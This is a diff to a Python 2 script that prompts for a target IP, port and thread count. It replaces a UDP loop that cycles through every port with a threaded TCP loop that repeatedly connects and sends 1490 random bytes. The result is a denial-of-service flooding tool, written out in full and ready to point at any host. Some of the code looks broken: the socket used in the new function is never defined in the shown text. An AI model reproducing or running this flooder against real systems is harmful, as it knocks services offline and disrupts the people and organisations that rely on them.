@@ -17,14 +17,17 @@ ip = raw_input("IP : ")
 port = input("Port : ")
 thread_num = input("Threads : ")
 
+def run():
+	bytes = random._urandom(1490)
+	while True:
+		try:
+			s.connect((str(ip),int(port))) 
+			s.send(bytes)
+			print "\033[92m [+] Package Sent ! \033[0m"
+		except:
+			s.close()
+			print "\033[91m [!] Error , Socket Closed \033[0m"
+			
 for i in range(thread_num):
     th = threading.Thread(target = run)
     th.start()
-    
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s Packet To %s Throught Port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
